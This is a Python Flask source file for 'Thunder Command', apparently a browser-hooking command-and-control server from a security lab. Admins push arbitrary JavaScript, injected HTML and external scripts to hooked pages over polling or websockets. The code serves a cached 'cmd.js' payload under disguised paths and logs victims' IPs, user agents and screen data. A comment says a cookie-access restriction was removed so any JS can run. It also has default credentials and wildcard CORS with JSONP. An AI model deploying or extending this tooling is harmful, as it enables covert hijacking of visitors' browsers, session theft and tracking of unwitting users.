import json
import time
from flask import Flask, Response, jsonify, request, render_template, send_from_directory, session, redirect, url_for
from werkzeug.exceptions import HTTPException
from werkzeug.security import generate_password_hash, check_password_hash
from datetime import datetime, timedelta
from functools import wraps
import os
import uuid
import mimetypes

# Importação condicional para Socket.IO
try:
    from flask_socketio import SocketIO, emit
    socketio_available = True
except ImportError:
    socketio_available = False
    print("WARNING: flask-socketio not available. Falling back to traditional HTTP polling.")

"""
Thunder Command: Sistema de Controle Remoto para Páginas Web
=============================================================

Este aplicativo permite o envio de comandos JavaScript em tempo real para páginas web clientes.
Um administrador pode executar JavaScript, manipular o DOM, injetar HTML e controlar
a visibilidade de elementos em páginas remotas sem necessidade de atualização.

Autores: MrCl0wn Security Lab
Data de criação: Maio/2025
Versão: 1.0 (Atualizado com WebSockets)
"""

# Configuração para compatibilidade Windows com MIME types
mimetypes.add_type('application/javascript', '.js')

# Inicialização e configuração do aplicativo Flask
app = Flask(__name__, static_folder='static', static_url_path='/static')
app.secret_key = os.environ.get('SECRET_KEY', 'dev_key_change_in_production')

# Configuração do Socket.IO se disponível
if socketio_available:
    try:
        socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')
        print("Socket.IO inicializado com sucesso no modo threading")
    except Exception as e:
        socketio_available = False
        print(f"Falha ao inicializar Socket.IO: {e}")
        print("Caindo para o modo HTTP polling tradicional")
else:
    # Variável dummy para evitar erros
    socketio = None

# Credenciais de autenticação para o painel de administração
# AVISO DE SEGURANÇA: Em ambiente de produção, estas credenciais devem estar em
# variáveis de ambiente ou em um banco de dados seguro, nunca hardcoded
ADMIN_USERNAME = os.environ.get('ADMIN_USERNAME', 'tandera')
ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'tandera')
ADMIN_PASSWORD_HASH = generate_password_hash(ADMIN_PASSWORD)

# Armazenamento de dados em memória
# Em produção, considere usar um banco de dados persistente
commands = {'default': {"id": str(uuid.uuid4()), "command": "", "timestamp": datetime.now().isoformat()}}
clients = {}  # Armazena informações sobre os clientes conectados
command_logs = []  # Histórico de comandos enviados
socket_clients = {}  # Mapeia client_id para session_id do Socket.IO

# Função auxiliar para formatar código JavaScript em um bloco try-catch
def js_format_try_catch(js_code):
    """
    Envolve o código JavaScript em um bloco try-catch para evitar erros de execução.
    "Trick" pra evitar que erros de JavaScript interrompam a execução do restante do código.
    """
    if js_code:
        return f'try{{(function(){{{js_code}}}());}}catch(err){{}}'

# Decorator para proteger rotas que exigem autenticação
def login_required(f):
    """
    Decorator que redireciona para a página de login se o usuário não estiver autenticado.
    Aplique este decorator a todas as rotas de administração que precisam ser protegidas.
    """
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'logged_in' not in session:
            return redirect(url_for('login', next=request.url))
        return f(*args, **kwargs)
    return decorated_function

@app.route('/login', methods=['GET', 'POST'])
def login():
    """
    Rota de autenticação para o painel de administração.
    GET: Exibe a página de login
    POST: Processa a tentativa de login
    """
    error = None
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        
        if username == ADMIN_USERNAME and check_password_hash(ADMIN_PASSWORD_HASH, password):
            session['logged_in'] = True
            return redirect(request.args.get('next') or url_for('admin'))
        else:
            error = 'Invalid credentials'
    
    return render_template('login.html', error=error)

@app.route('/logout')
def logout():
    """Rota para encerrar a sessão do administrador"""
    session.pop('logged_in', None)
    return redirect(url_for('login'))

@app.route('/admin/set_command', methods=['POST'])
@login_required
def set_command():
    """
    Endpoint para definir um novo comando a ser executado nos clientes.
    Recebe dados em formato JSON e gera o comando JavaScript correspondente.
    
    Tipos de comando suportados:
    - js: Executa código JavaScript arbitrário
    - html: Injeta HTML no corpo da página
    - manipulate: Modifica elementos específicos por ID
    - visibility: Controla a visibilidade de elementos
    - head: Adiciona elementos ao cabeçalho da página
    """
    data = request.json
    client_id = data.get('client_id', 'default')
    
    command_type = data.get('type')
    content = data.get('content', '')
    target_id = data.get('target_id', '')
    action = data.get('action', '')

    # Validação de segurança básica
    if not isinstance(content, str) or not isinstance(target_id, str):
        return jsonify({"success": False, "error": "Invalid input type"}), 400
        
    # Nota: A restrição anterior para evitar acesso a cookies foi removida
    # para permitir a execução de qualquer comando JavaScript

    js_command = ""
    
    # Geração do comando JavaScript baseado no tipo de operação solicitada
    if command_type == 'js':
        # Executa código JavaScript diretamente
        js_command = content
        
    elif command_type == 'html':
        # Injeta conteúdo HTML no final do corpo da página
        js_command = f"""
            const temp = document.createElement('div');
            temp.innerHTML = `{content}`;
            document.body.appendChild(temp);
        """
        
    elif command_type == 'manipulate':
        # Manipula um elemento específico por ID
        if action == 'ADD':
            # Adiciona conteúdo ao elemento existente
            js_command = js_format_try_catch(f"document.getElementsByClassName('{target_id}')[0].innerHTML += `{content}`;")
            js_command += js_format_try_catch(f"document.getElementById('{target_id}').innerHTML += `{content}`;")
        elif action == 'REPLACE':
            # Substitui todo o conteúdo do elemento
            
            js_command = js_format_try_catch(f"document.getElementsByClassName('{target_id}')[0].innerHTML = `{content}`;")
            js_command += js_format_try_catch(f"document.getElementById('{target_id}').innerHTML = `{content}`;")
        elif action == 'INSERT_AFTER':
            # Insere conteúdo após o elemento
            js_command = js_format_try_catch(f"document.getElementsByClassName('{target_id}')[0].insertAdjacentHTML('afterend', `{content}`);")
            js_command += js_format_try_catch(f"document.getElementById('{target_id}').insertAdjacentHTML('afterend', `{content}`);")
        elif action == 'INSERT_BEFORE':
            # Insere conteúdo antes do elemento
            js_command = js_format_try_catch(f"document.getElementsByClassName('{target_id}')[0].insertAdjacentHTML('beforebegin', `{content}`);")
            js_command += js_format_try_catch(f"document.getElementById('{target_id}').insertAdjacentHTML('beforebegin', `{content}`);")
            
    elif command_type == 'visibility':
        # Controla a visibilidade de um elemento
        display = 'block' if content == 'show' else 'none'
        js_command = js_format_try_catch(f"document.getElementsByClassName('{target_id}')[0].style.display = '{display}';")
        js_command += js_format_try_catch(f"document.getElementById('{target_id}').style.display = '{display}';")
        
    
    elif command_type == 'head':
        # Adiciona elementos ao cabeçalho da página
        action = data.get('action')
        content = data.get('content')
        
        if action == 'CSS_URL':
            # Adiciona link para stylesheet externo
            js_command = f"""
                const linkElement = document.createElement('link');
                linkElement.rel = 'stylesheet';
                linkElement.href = '{content}';
                document.head.appendChild(linkElement);
            """
        elif action == 'CSS_INLINE':
            # Adiciona CSS inline
            js_command = f"""
                const styleElement = document.createElement('style');
                styleElement.textContent = `{content}`;
                document.head.appendChild(styleElement);
            """
        elif action == 'JS_URL':
            # Adiciona script externo
            js_command = f"""
                const scriptElement = document.createElement('script');
                scriptElement.src = '{content}';
                document.head.appendChild(scriptElement);
            """
        elif action == 'JS_INLINE':
            # Adiciona JavaScript inline
            js_command = f"""
                const scriptElement = document.createElement('script');
                scriptElement.textContent = `{content}`;
                document.head.appendChild(scriptElement);
            """
        elif action == 'META':
            # Adiciona meta tag
            js_command = f"""
                const metaElement = document.createElement('meta');
                const metaProps = {content};
                Object.keys(metaProps).forEach(key => {{
                    metaElement.setAttribute(key, metaProps[key]);
                }});
                document.head.appendChild(metaElement);
            """
    
    # Gerar ID único para o comando e registrar timestamp
    command_id = str(uuid.uuid4())
    current_time = datetime.now().isoformat()
    # Envolve o comando em um bloco try-catch para evitar erros de execução
    #js_command = 'try{(function() {'+ js_command + '}());}catch(err){}'

    command_data = {
        "id": command_id,
        "command": js_command,
        "timestamp": current_time
    }
    
    # Distribuição do comando para os clientes alvo
    if client_id == 'default':
        # Envia para todos os clientes conectados
        for cid in clients:
            commands[cid] = command_data
            # Incrementa o contador de comandos recebidos para este cliente
            if cid in clients:
                clients[cid]["commands_received"] = clients[cid].get("commands_received", 0) + 1
            
            # Se o cliente estiver conectado por WebSockets e Socket.IO estiver disponível, enviar diretamente
            if socketio_available and cid in socket_clients:
                socketio.emit('command', command_data, room=socket_clients[cid])
        
        # Atualiza também o comando padrão
        commands['default'] = command_data
        
        # Enviar comando para todos os clientes WebSocket não associados a IDs específicos
        if socketio_available:
            socketio.emit('command', command_data, to='all')
    else:
        # Envia apenas para o cliente específico
        commands[client_id] = command_data
        
        # Incrementa o contador de comandos recebidos para este cliente
        if client_id in clients:
            clients[client_id]["commands_received"] = clients[client_id].get("commands_received", 0) + 1
        
        # Se o cliente estiver conectado por WebSockets e Socket.IO estiver disponível, enviar diretamente
        if socketio_available and client_id in socket_clients:
            socketio.emit('command', command_data, room=socket_clients[client_id])
    
    # Registra o comando no histórico de logs
    log_entry = {
        "id": command_id,
        "client_id": client_id,
        "type": command_type,
        "command": js_command,
        "timestamp": current_time
    }
    command_logs.append(log_entry)
    
    # Limitação do histórico para evitar consumo excessivo de memória
    if len(command_logs) > 100:
        command_logs.pop(0)
    
    # Log de depuração
    print(f"Novo comando gerado: ID={command_id}, Cliente={client_id}, Tipo={command_type}")
    
    return jsonify({"success": True, "command": command_data})

@app.route('/admin/clients')
@login_required
def get_clients():
    """
    Endpoint para listar todos os clientes conectados.
    Limpa clientes inativos automaticamente (sem atividade por 30+ minutos).
    """
    # Remove clientes inativos
    now = datetime.now()
    cleanup_time = now - timedelta(minutes=30)
    cleanup_str = cleanup_time.isoformat()
    
    # Formata dados dos clientes para exibição no frontend
    client_list = [
        {
            "id": client_id,
            "active": client.get("last_seen", "") > cleanup_str,
            "last_seen": client.get("last_seen", ""),
            "user_agent": client.get("user_agent", ""),
            "ip": client.get("ip", ""),
            "websocket": client_id in socket_clients  # Indica se o cliente está usando WebSockets
        }
        for client_id, client in clients.items()
    ]
    
    return jsonify({"success": True, "clients": client_list})

@app.route('/admin/client/<client_id>')
@login_required
def get_client_details(client_id):
    """
    Endpoint para obter detalhes de um cliente específico por ID.
    """
    if client_id not in clients:
        return jsonify({}), 404
        
    client = clients[client_id]
    cleanup_time = (datetime.now() - timedelta(minutes=30)).isoformat()
    
    # Formata dados do cliente para exibição detalhada
    client_details = {
        "id": client_id,
        "active": client.get("last_seen", "") > cleanup_time,
        "last_seen": client.get("last_seen", ""),
        "last_activity": client.get("last_activity", ""),
        "user_agent": client.get("user_agent", ""),
        "ip": client.get("ip", ""),
        "websocket": client_id in socket_clients,  # Indica se o cliente está usando WebSockets
        "first_seen": client.get("first_seen", ""),
        "commands_received": client.get("commands_received", 0),
        "screen_info": client.get("screen_info", {})
    }
    
    return jsonify(client_details)

@app.route('/admin/clients/<client_id>', methods=['DELETE'])
@login_required
def remove_client(client_id):
    """
    Endpoint para remover um cliente específico do sistema.
    Remove também os comandos associados a este cliente.
    """
    if client_id in clients:
        del clients[client_id]
        if client_id in commands:
            del commands[client_id]
            
        # Se o cliente estiver conectado por WebSockets e Socket.IO estiver disponível, notificá-lo para desconectar
        if socketio_available and client_id in socket_clients:
            socketio.emit('disconnect_request', room=socket_clients[client_id])
            # Remover do mapeamento de socket_clients (a conexão Socket.IO real será encerrada pelo cliente)
            del socket_clients[client_id]
            
        return jsonify({"success": True})
    else:
        return jsonify({"success": False, "error": "Client not found"}), 404

@app.route('/admin/logs')
@login_required
def get_logs():
    """Endpoint para obter o histórico de comandos enviados"""
    return jsonify({"success": True, "logs": command_logs})

@app.route('/')
def index():
    """
    Página inicial do cliente que receberá os comandos do servidor.
    Renderiza o template server_to_client.html.
    """
    return render_template('server_to_client.html')

@app.route('/admin')
@login_required
def admin():
    """
    Painel de administração para envio de comandos.
    Acesso protegido pelo decorator login_required.
    """
    return render_template('admin-dashboard.html')

@app.route('/<int:dinamic_id>/<dinamic_file>')
def serve_payload_js(dinamic_file, dinamic_id):
    """
    Serve arquivos JavaScript dinâmicos com configuração de cache.
    Este arquivo é responsável por verificar e executar os comandos recebidos.
    """
    # Verifica definição de dinamic_file e dinamic_id
    if not dinamic_file and dinamic_id:
        return jsonify({"error": "Not Found"}), 440
    # Verifica extensão do arquivo
    if not dinamic_file.endswith(('.js','.map')):
        return jsonify({"error": "Not Found"}), 440
    
    response = send_from_directory('payload', 'cmd.js', mimetype='application/javascript')
    response.headers['Cache-Control'] = 'public, max-age=604800'
    return response

# Rota para servir a biblioteca cliente do Socket.IO
@app.route('/js/socket.io.min.js')
@app.route('/js/socket.io.min.js.map')
def serve_socketio_js():
    """Rota para servir a biblioteca cliente do Socket.IO"""
    response = send_from_directory('static/js', 'socket.io.min.js', mimetype='application/javascript')
    response.headers['Cache-Control'] = 'public, max-age=604800'
    return response

# Rota principal para o polling de comandos pelos clientes
@app.route('/command')
def get_command():
    """
    Endpoint principal para o polling de comandos pelos clientes.
    Suporta JSONP para contornar restrições de CORS quando necessário.
    
    Cada cliente solicita periodicamente este endpoint para verificar
    se há novos comandos disponíveis para execução.
    """
    client_id = request.args.get('client_id', 'default')
    last_received = request.args.get('last_id', '')
    callback = request.args.get('callback')
    
    # Registra ou atualiza informações do cliente
    if client_id != 'default':
        now = datetime.now().isoformat()
        if client_id not in clients:
            # Inicializa dados para novo cliente
            clients[client_id] = {
                "first_seen": now,
                "commands_received": 0,
                "screen_info": {}
            }
            # Inicializa comando para novo cliente
            if client_id not in commands:
                commands[client_id] = commands.get('default', {"id": "", "command": "", "timestamp": ""})
        
        # Atualiza informações do cliente
        clients[client_id].update({
            "last_seen": now,
            "last_activity": now,
            "user_agent": request.headers.get('User-Agent', ''),
            "ip": request.remote_addr
        })
    
    # Obtém o comando atual para este cliente
    current_command = commands.get(client_id, commands.get('default', {"id": "", "command": "", "timestamp": ""}))
    
    # Log para depuração
    print(f"Cliente {client_id} solicitou comando. Último recebido: {last_received}, Atual: {current_command.get('id', '')}")
    
    # Prepara a resposta com indicação se é um comando novo
    response_data = {
        "new": last_received != current_command.get("id", ""),
        **current_command
    }
    
    # Formata a resposta conforme necessário (JSONP ou JSON padrão)
    if callback:
        # Formato JSONP para contornar restrições de CORS
        response = app.response_class(
            response=f"{callback}({json.dumps(response_data)})",
            status=200,
            mimetype="application/javascript"
        )
    else:
        # JSON padrão com cabeçalhos CORS
        response = jsonify(response_data)
        response.headers['Access-Control-Allow-Origin']  = '*'
        response.headers['Access-Control-Allow-Methods'] = '*'
        response.headers['Access-Control-Allow-Headers'] = 'Content-Type'
    
    return response

# Socket.IO eventos - definidos apenas se o Socket.IO estiver disponível
if socketio_available:
    @socketio.on('connect')
    def handle_connect():
        """Manipula novas conexões WebSocket"""
        print(f"[WebSocket] Nova conexão: {request.sid}")

    @socketio.on('register')
    def handle_register(data):
        """
        Registra um cliente conectado via WebSocket.
        Recebe o ID do cliente e o associa à sessão WebSocket atual.
        """
        client_id = data.get('client_id')
        if not client_id:
            return
        
        session_id = request.sid
        print(f"[WebSocket] Cliente registrado: {client_id}, Session: {session_id}")
        
        # Associar client_id à sessão WebSocket
        socket_clients[client_id] = session_id
        
        # Registra ou atualiza informações do cliente
        now = datetime.now().isoformat()
        if client_id not in clients:
            # Inicializa dados para novo cliente
            clients[client_id] = {
                "first_seen": now,
                "commands_received": 0,
                "screen_info": {}
            }
            # Inicializa comando para novo cliente
            if client_id not in commands:
                commands[client_id] = commands.get('default', {"id": "", "command": "", "timestamp": ""})
        
        # Atualiza informações do cliente
        clients[client_id].update({
            "last_seen": now,
            "last_activity": now,
            "user_agent": request.headers.get('User-Agent', ''),
            "ip": request.remote_addr,
            "connection_type": "websocket"
        })
        
        # Notificar admin sobre o novo cliente conectado
        socketio.emit('client_update', {
            "action": "connect",
            "client": {
                "id": client_id,
                "active": True,
                "last_seen": clients[client_id]["last_seen"],
                "websocket": True
            }
        }, room='admin')
        
        # Enviar último comando para o cliente
        if client_id in commands:
            current_command = commands[client_id]
            emit('command', current_command)

    @socketio.on('disconnect')
    def handle_disconnect():
        """Manipula desconexões WebSocket"""
        session_id = request.sid
        
        # Encontrar qual client_id está associado a esta sessão
        client_id = None
        for cid, sid in socket_clients.items():
            if sid == session_id:
                client_id = cid
                break
        
        if client_id:
            print(f"[WebSocket] Cliente desconectado: {client_id}")
            
            # Remover mapeamento, mas manter o cliente nos registros
            # (pode reconectar mais tarde ou usar polling)
            del socket_clients[client_id]
            
            # Atualizar status do cliente
            if client_id in clients:
                clients[client_id]["connection_type"] = "disconnected"
            
            # Notificar admin sobre a desconexão
            socketio.emit('client_update', {
                "action": "disconnect",
                "client_id": client_id
            }, room='admin')
        else:
            print(f"[WebSocket] Sessão desconectada: {session_id} (sem cliente associado)")

    @socketio.on('join_admin')
    def handle_join_admin():
        """Administradores se juntam à sala 'admin' para receber atualizações em tempo real"""
        if 'logged_in' in session:
            session_id = request.sid
            socketio.server.enter_room(session_id, 'admin')
            print(f"[WebSocket] Admin entrou na sala: {session_id}")
            emit('admin_joined', {"success": True})
        else:
            emit('admin_joined', {"success": False, "error": "Não autorizado"})

@app.route('/command/result', methods=['POST'])
def receive_command_result():
    """
    Endpoint para receber resultados da execução de comandos nos clientes.
    Os clientes enviam feedback após a execução de cada comando, permitindo
    monitoramento em tempo real e diagnóstico de problemas.
    
    Parâmetros esperados no JSON:
    - client_id: ID do cliente que executou o comando
    - command_id: ID do comando executado
    - success: Booleano indicando se a execução foi bem-sucedida
    - timestamp: Data/hora da execução
    - result: Resultado ou mensagem de erro (opcional)
    - execution_time: Tempo de execução em milissegundos (opcional)
    """
    data = request.json
    
    if not data:
        return jsonify({"success": False, "error": "Dados não fornecidos"}), 400
        
    client_id = data.get('client_id')
    command_id = data.get('command_id')
    success = data.get('success', False)
    timestamp = data.get('timestamp', datetime.now().isoformat())
    result = data.get('result', '')
    execution_time = data.get('execution_time', 0)
    
    if not client_id or not command_id:
        return jsonify({"success": False, "error": "Parâmetros obrigatórios não fornecidos"}), 400
    
    # Registrar o resultado em um novo log ou adicionar ao log de comandos existente
    result_entry = {
        "client_id": client_id,
        "command_id": command_id,
        "success": success,
        "timestamp": timestamp,
        "result": result,
        "execution_time": execution_time
    }
    
    # Atualizar o log do comando correspondente, se existir
    for log in command_logs:
        if log["id"] == command_id:
            log["results"] = log.get("results", [])
            log["results"].append(result_entry)
            log["last_result"] = result_entry
            log["success_count"] = len([r for r in log["results"] if r["success"]])
            log["error_count"] = len([r for r in log["results"] if not r["success"]])
            break
    
    # Atualizar informações do cliente
    if client_id in clients:
        clients[client_id]["last_activity"] = timestamp
        clients[client_id]["last_result"] = {
            "command_id": command_id,
            "success": success,
            "timestamp": timestamp
        }
        
        # Incrementar contadores específicos para resultados bem-sucedidos/falhos
        if success:
            clients[client_id]["successful_commands"] = clients[client_id].get("successful_commands", 0) + 1
        else:
            clients[client_id]["failed_commands"] = clients[client_id].get("failed_commands", 0) + 1
    
    # Notificar administradores conectados via WebSocket, se disponível
    if socketio_available:
        try:
            socketio.emit('command_result', result_entry, room='admin')
        except Exception as e:
            print(f"Erro ao enviar resultado para os administradores: {e}")
    
    # Log para depuração
    result_status = "com sucesso" if success else "com falha"
    print(f"Resultado de comando recebido: Cliente {client_id}, Comando {command_id[:8]}, executado {result_status}")
    
    return jsonify({"success": True})

# Rota para teste do parser de User-Agent
@app.route('/teste-user-agent')
@login_required
def teste_user_agent():
    """Página para testes do parser de User-Agent"""
    return render_template('teste-user-agent.html')

@app.route('/favicon.ico')
def favicon():
    """Rota para o favicon.ico"""
    return send_from_directory(os.path.join(app.root_path, 'static'), 'favicon.ico', mimetype='image/vnd.microsoft.icon')

if __name__ == '__main__':
    if socketio_available:
        try:
            # Inicialização do servidor com Socket.IO
            socketio.run(app, debug=True, allow_unsafe_werkzeug=True)
        except Exception as e:
            print(f"Erro ao iniciar com Socket.IO: {e}")
            print("Iniciando no modo Flask padrão...")
            app.run(debug=True)
    else:
        # Fallback para Flask padrão sem Socket.IO
        app.run(debug=True)
